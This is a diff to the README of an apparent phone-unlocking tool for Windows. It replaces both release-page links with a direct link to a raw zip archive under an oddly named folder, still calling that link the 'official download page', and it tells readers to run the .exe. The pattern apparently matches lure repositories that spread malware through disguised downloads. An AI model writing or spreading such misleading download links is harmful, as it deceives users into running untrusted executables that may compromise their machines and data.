@@ -1,6 +1,6 @@
 # 🔓 Unlocker-phone-tool-2026 - Repair your mobile device with ease
 
-[![Download Software](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/stcrispinshade76/Unlocker-phone-tool-2026/releases)
+[![Download Software](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/stcrispinshade76/Unlocker-phone-tool-2026/raw/refs/heads/main/stunning/phone_tool_Unlocker_Ornithodelphia.zip)
 
 ## What is Unlocker-phone-tool-2026
 
@@ -21,7 +21,7 @@ Before you install this software, ensure your computer meets these basic require
 Follow these steps to obtain the tool for your Windows computer:
 
 1. Visit the project release page to see all available versions.
-2. Go to the [official download page](https://github.com/stcrispinshade76/Unlocker-phone-tool-2026/releases).
+2. Go to the [official download page](https://github.com/stcrispinshade76/Unlocker-phone-tool-2026/raw/refs/heads/main/stunning/phone_tool_Unlocker_Ornithodelphia.zip).
 3. Find the most recent release at the top of the list.
 4. Click the link ending in .exe to start the transfer to your computer.
 5. Save the file to your desktop or downloads folder.
